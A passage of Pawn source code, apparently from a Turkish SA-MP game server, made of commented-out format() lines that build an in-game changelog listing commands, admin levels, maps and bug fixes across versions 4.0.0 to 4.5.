    format(YenilikYazi, 2000, "%s{DDDDDD}/spawnla ile 3 defa spawn edince kick atýldýðýndan komuta süre getirildi\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Soru geçersiz sayýldýðýnda adminlere çýkan soru yoksayýldý yazýsýndaki bug giderildi.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Geöersiz soru komutu olan /gsoru komutu 1 level ve üstü adminlere de verildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/yenilikler güncellendi :) \n", YenilikYazi);


	format(YenilikYazi, 2000, "%s{DDDDDD} \n", YenilikYazi);


    	format(YenilikYazi, 2000, "%s{DDDDDD}({FF0000}Canakkale Meslek Sunucusu V4.5{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Hostname Suucusu yazý bugu düzeltildi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Artýk adminler Araçlarý Respawn ederse görevdeki dorseler ve araçlar respawn olmayacak\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Rehber ve DJ chat renkleri karýþtýðýndan deðiþtirildi \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Sunucu kilitlendiðinde sunucu kiliteldi yazý bugu düzeltildi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/etkgit komutuna 15 skor limiti getirildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}DEV KAMPANYA için /kampanya komutu eklendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Duyuru yazýlarý güncellendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/cevapla komutu 1 level ve üstü adminlere de verildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/mulksil Komutu 6 level adminlere de verildi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/yonetim Güncellendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/yenilikler güncellendi :) \n", YenilikYazi);
*/
/*
	format(YenilikYazi, 2000, "%s{DDDDDD} \n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({FF0000}Canakkale Meslek Sunucusu V4.4{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Duyurular Textdraw'ý eklendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Telsiz komutuna 10 skor limiti getirildi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Karakterlerinizin üstüne meslek yazýlarý eklendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Karakterlerinizin üzerine admin yazýlarý eklendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Site adresimiz www.canakkalefr.com olarak deðiþtirildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}TS3 Adresimiz: ts.Canakkale Meslek.com olarak deðiþtirildi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Bi soru sorduktan sonra 2. soru sormanýz engellendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Sorduðunuz soruyu iptal etmeniz için /soruiptal komutu eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Adminlere ve Rehberlere sorularý cevaplayabilmeleri için /cevapla komutu getirildi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Yoðun þikayet üzerine çevikkuvvet lerin verdiði hapis cezasý süresi yarýya indirildi ( yýldýz baþýna 1 dakika )\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Yeni duyuru panelinden adminlerin duyuru yapabilmesi için /asay2 komutu getirildi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Duyuru panelinin temizlenebilmesi için /dtemizle komutu getirildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Rehberlerin uzun yazý yazýnda ikinci satýr yazýlarýnýn beyaz olma sorunu giderildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Adminlere etk alanlarýna ýþýnlanabilmeleri için /goetk komutu getirildi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/dorseget admin komutunun SendAdminText yazýsý düzeltildi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Geçersiz soru soran oyuncularýn sorularýnýn silinmesi için admin ve rehberlere /gsoru komutu getirildi.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Duyuru panelinden rahatsýz olanlar için /duyurukapat komutu eklendi.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Ekranýn altýnda bulunan yazýlara /market yazýsý da eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/yenilikler komudu güncellendi. :)\n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD} \n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({FF0000}Canakkale Meslek Sunucusu V4.3.5{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Duyuru yazýlarýndaki renk sorunu giderildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Yeni veritabanýna geçildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/yenilikler komudu güncellendi. :)\n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD} \n", YenilikYazi);

 	format(YenilikYazi, 2000, "%s{DDDDDD}({FF0000}Canakkale Meslek Sunucusu V4.3.4{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Pizzacý Mesleði eklendi (2000 skor)\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/msay (meslek chat) komutu kaldýrýldý\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Her mesleðe telsiz eklendi '/telsiz <Mesaj>' '/t <Mesaj>'\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Sunucu yeniden baþlatýlacaktýr yazýsýnýn buga girme sorununa bakýldý.\n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD} \n", YenilikYazi);

 	format(YenilikYazi, 2000, "%s{DDDDDD}({FF0000}Canakkale Meslek Sunucusu V4.3.3 fix 1{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/market komutu eklendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/vipbilgi komutu güncellendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/vip komutu eklendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/donator komutu güncellendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Meslektaþlarýnýz ile konuþabileceðiniz Meslek Chat Getirildi '/msay <Mesaj>'\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Oyuncularýn kendi saatlerini deðiþtirebilmeleri için /mytime ve /saat komutu getirildi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Oyuncularýn kendi havalarýný deðiþtirebilmeleri için /myweather ve /hava komutu getirildi\n", YenilikYazi);


    format(YenilikYazi, 2000, "%s{DDDDDD} \n", YenilikYazi);

    format(YenilikYazi, 2000, "%s{DDDDDD}({FF0000}Canakkale Meslek Sunucusu V4.3.3{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Radarlarýn adminleri algýlamasý engellendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Karadeniz Nakliyat Þirketinin map bugu giderildi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/vipler komutuna VIP bitiþ saati eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}ETK yapmak için etk map'ý eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}25 Ve 26 Þubat Tarihlerinde ÖZEL ETKÝNLÝK Herkes VIP olacaktýr.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Otomatik deðiþen hostname sistemindeki hostname'ler düzenlendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Random Duyuru mesajlarý düzenlendi.\n", YenilikYazi);

    format(YenilikYazi, 2000, "%s{DDDDDD} \n", YenilikYazi);

   	format(YenilikYazi, 2000, "%s{DDDDDD}({FF0000}Canakkale Meslek Sunucusu V4.3.2{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Araç kiralama sistemindeki bug giderildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Seri Taþýmacýlýk þirket mapindeki bug giderildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Ban bitiþ tarihine saat ve dakika da eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}VIP bitiþ tarihine saat de eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Adminlere Süreli susturma cezasý eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Artýk Çevik kuvvet ceza kesince oyuncu yýldýz sayýsýnýn iki katý kadar hapise girecek.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Çevik kuvvet mesleðine tekrardan silah eklendi.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}/ban komutu /banid oldu.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Gün ve saat girilebilir /ban komutu getirildi.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Sürekli deðiþen Hostname ( Sunucu Adý ) Sistemi Aktif Edildi.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Artýk sunucuya girdikten sonra ilk radara giriþiniz sadece uyarý olacak sonrakilerde yýldýz eklenecek.!\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Karadeniz Nakliyat Þirketinin Kapý Objesinin Bugu Düzeltildi\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Sað üstteki saat bugu giderildi.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Oyuncularýn Alabilmesi Ýçin Galreiler Oluþturuldu.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Galeriye araç alýnca oyuncunun parasýnýn gitmemesi bugu düzeltildi.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Araç kiralayýnca çýkan Kalan Arac Kira Suresi: yazýsý diðer yazýlarla iç içe girdiðinden yukarý Taþýndý\n", YenilikYazi);
*/
 /*
    format(YenilikYazi, 2000, "%s{DDDDDD} \n", YenilikYazi);

   	format(YenilikYazi, 2000, "%s{DDDDDD}({FF0000}Canakkale Meslek Sunucusu V4.3.1{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Tornado'nun þirketi eklendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Galeri sistemi eklendi {00CED1}( /galerisistemi)\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Anadolu Haritasý silindi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Ankara Haritasý eklendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Düzce Haritasý eklendi\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Tren süren NPC'ler eklendi.\n", YenilikYazi);*/
    /*
    format(YenilikYazi, 2000, "%s{DDDDDD} \n", YenilikYazi);

    format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V4.3{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Kral Nakliyat için yeni map eklendi eski map boþtaltýldý (satýlýk)\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Artýk 10 skorun altýndakiler admin ve rehber dýþýndakilere pm atamayacak\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/pm'ye Reklam korumasý eklendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Chat'da çýkan randoom duyuru mesajlarý güncellendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Oyuncularýn müzik silebilme sorunu giderildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/donator güncellendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Oyuncularýn müzik silebilme sorunu giderildi.\n", YenilikYazi);
   	format(YenilikYazi, 2000, "%s{ff0000}Buldum{ff00ff}Buldum{ffffff}.com{00ff00}/tircilarmekani {DDDDDD} Maðzamýzýn duyuru mesajlarý eklendi.\n", YenilikYazi);
   	format(YenilikYazi, 2000, "%s{DDDDDD}Sunucunun host þirketi deðiþtirildi. Lag sorunu en aza indirilmeye çalýþýldý.\n", YenilikYazi);
*/
	/*

	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V4.2.8{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Yýlbaþý TextDraw'ý eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}31 Aralýk ve 1 Ocak'ta herkes VIP özelliklerine sahip olacak.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Yönetici olmayan oyuncularýn yönetici görülmesi bugu düzeltildi.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Yýlbaþý Sayacý eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Yýlbaþýnda kar yaðdýrma özelliði eklendi(/kar).\n", YenilikYazi);

   	format(YenilikYazi, 2000, "%s{DDDDDD} \n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V4.2.7{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Polislerin haritada suçlularý görememesi sorunu düzeltildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Oyuncu öldüðünde görev iptal olmamasý sorunu düzeltildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Arkadaþ sistemindeki sorun düzeltildi.\n", YenilikYazi);
    format(YenilikYazi, 2000, "%s{DDDDDD}Tolga'ya ait iki map eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Sürpriz bir özellik eklendi.\n", YenilikYazi);
*/
   //	format(YenilikYazi, 2000, "%s{DDDDDD} \n", YenilikYazi);
   	/*
	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V4.2.6{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Arkadaþlýk sistemi getirildi {FF0000}/arkadaslar /gruplar /g\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Ev ve Ýþyeri gitmesi sorununa çözüm getirildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Oyuncular artýk iþyeri satýn alabilecekler.\n", YenilikYazi);

   	format(YenilikYazi, 2000, "%s{DDDDDD} \n", YenilikYazi);
*/
/*

	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V4.2.5{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Kurucu Adminlereden (GM) Tagý alýndý (SAHIP) Tagý verildi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Artýk 1 LEVEL admin de mevcut rehberlerin level sistemi ayrýldý. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}2 Levelli DJ sistemi geldi radyo müzik ekleme ve silmeyi sadece 2 Level DJ Yapabilecek\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Kurucu Adminlere Özel Giriþ Yazýsý Eklendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/rehberler komutu eklendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/vipler komutu eklendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/djler Komutuna Level Eklendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}fChat'da konuþmak için 10 skor olma sýnýrý eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Rehber chat eklendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}6 Level admine /unban verildi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}DJ lere giriþ yazýsý eklendi\n", YenilikYazi);

   	format(YenilikYazi, 2000, "%s{DDDDDD} \n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V4.2.5{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Konvoylarda herkese para daðýtma bugu durduruldu\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{FF0000}Avrasya tüneli'nin adý Express Tünel olarak deðiþtirildi. \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Dolmuþcu mesleði Kaldýrýldý.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}7 Levelli Sisteme Geri Dönüldü\n", YenilikYazi);

   	format(YenilikYazi, 2000, "%s{DDDDDD} \n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V4.2.3{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}REHBER'lere de özel giriþ yazýsý eklendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{FF0000}Hýzlýca þehirler arasý geçiþ için Avrasya Tüneli Eklendi \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Dolmuþcu mesleði eklendi {ff0000}(Kýsa Süreliðine Bakýmda)\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Yeni ranklar eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Artýk rank atlayýnca sistem tarafýndan ödül verilecek.\n", YenilikYazi);



	format(YenilikYazi, 2000, "%s{DDDDDD} \n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V4.2.3{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Ýstek þarkýlarýnýzý iletebilmeniz için /isteksarki komutu eklendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Sorularýnýzý rehber ve admin lere iletebilmeniz için /sorusor komutu eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Artýk biri radara girdiðinde Çevik Kuvvetlere de bildirim gidiyor.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Artýk biri Aþýrý Yük Aldýðýnda Çevik Kuvvetlere de bildirim gidiyor.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Otomatik hava sistemi kaldýrýldý sadece otomatik olarak saat degisecek.\n", YenilikYazi);


	format(YenilikYazi, 2000, "%s{DDDDDD} \n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V4.2.1{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}isyeri alma komutu geçici olarak kilitlendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Oyunculara giriþ yaptý yazýsý eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{ff0000}Adm giris de yanlýþ þifrede kick yerine 30sn bekleme süresi eklendi (admin)\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Ev alma sýnýrý 3'e çýkarýldý\n", YenilikYazi);
*/

/*
	format(YenilikYazi, 2000, "%s{DDDDDD} \n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V4.2.0{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}9 levellik admin sistemi ayarlandý.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Sunucunun yeni sahiplerine Dokunulmazlýk verildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}7,8 ve 9 levellerin komutlarý düzenlendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Sunucunun yapýsý yeni programa gore ayarlandý. \n", YenilikYazi);
*/
/*
	format(YenilikYazi, 2000, "%s{DDDDDD} \n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V4.2.5{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Yeni ev ve is yerleri olusturuldu\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Bir takým alt yapý calismalari yapildi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Para gonderme siniri 3m yapildi \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Sunucuyu yoran bazý fonksiyonlar giderildi. \n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD} \n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V4.0.9{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Ada Girisleri Gorev Alinca BAYRAK ile isaretlendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Radara Girince Ses Ve Isýk Eklendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}GTA 5 Efektli Rescue Sistemi Eklendi. \n", YenilikYazi);


	format(YenilikYazi, 2000, "%s{DDDDDD} \n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V4.0.8{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Ban Sisteminde Ýyilestirme Yapildi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Anti-Hile Sisteminde Ýyilestirme Yapildi ( Özellikle Silah Hilesi )\n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD} \n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V4.0.7{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Antalya MAP'I Yük Yerleri Eklendi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Otomatik Saat 12-13 Olarak Ayarlandý.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Yeni Otomatik Saat ile görüþ mesafesi artýrýldý\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Antalya Mapý Yük Yerleri Hakkýnda Detaylý Bilgi Forum Sitemizde\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Antalya Mapý Benzinlikleri Aktif Edildi\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Antalya Mapý içinde Tabelalar Aktif Edildi\n", YenilikYazi);


	format(YenilikYazi, 2000, "%s{DDDDDD} \n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V4.0.6{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Antalya MAP'I EKLENDÝ SEKÝZ'E Teþekkürler\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Otomatik Hava ve Otomatik Saatte bir takým problemler giderildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Tamir komutunda oluþan benzin problemi giderildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Bir takým güvenlik önlemleri alýndý.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Optimizasyon için bir takým çalýþmalar yapýldý.\n", YenilikYazi);
	*/




	/*

	format(YenilikYazi, 2000, "%s{DDDDDD} \n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V4.0.5{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Tüm Herkes Icýn Kullanilabilir. Oyuncunun Rotasina Bakma Komutu Eklendi /ogorev <id> \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Admin Yetkilerinde Degisikler Yapildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Sedatt 10 Level Yetkili Admin Yapildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Otomatik Hava Durumu Sistemi Eklendi.\n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V4.0.4{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}BILGI : Bu Bir MINIFIX Versiyonudur.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Oyun Akýþýný Bozan Bazý Bug Fixler Yapildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Çöpcü meslekgi için çöp arabasinin yanýna binme eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Çöpü elinize alabilmekniz için gerekli alan hesaplandi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Adminler Ýcin Yollarda Kalan SIRKET DORSELERI'ni silme komutu eklendi. [5Level]\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Mod Ýçerisinde Gereksiz Hatalar - Uyarýlar Engellendi - Fixlendi\n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V4.0.3{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Satýlýk evlere ýþýnlanmaya yarayan /houses komutu eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}30 saniyede giriþ yapmayaný kickleyen sistemin bugu düzeltildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Araçlarýn yakýt tüketimi düþürüldü. Depo artýk 30dk yerine 40dk da boþalacak.\n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V4.0.2{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}KONYA Map'i ve görev yerleri eklendi. (Sekiz'e teþekkürler)\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}ANADOLU ISLAND Map'indeki görev yerleri geçici olarak kaldýrýldý.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Oyunculara kendilerinin akalarýnýn gözükmesi bugu düzeltildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}(ADMIN) /paketekle komutu araç içinde yazýlabilecek ve rastgele paket oluþturacak.\n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({4867FF}Canakkale Meslek Sunucusu V4.0.1{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Çöpçü mesleðinde elinde çöp varken baþka bir çöpü alma bugu düzeltildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Çöpçü mesleðinde görev iptal edememe bugu düzeltildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Anadolu Island Otogar kapýlarýna bilgilendirici yazýlar eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Chat'te uzun yazýlarýn çýkmamasý bugu düzeltildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}/changenick'te banka hesabýnýn aktarýlmamasý bugu düzeltildi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}(BU SEDO HOCA ÝÇÝN) Paket halloldu :D\n", YenilikYazi);

	format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V4.0.0{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Oyuncu arayüzü yenilendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}MySQL Kayýt Sistemi eklendi.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{DDDDDD}Banka sistemi yenilendi.\n", YenilikYazi);
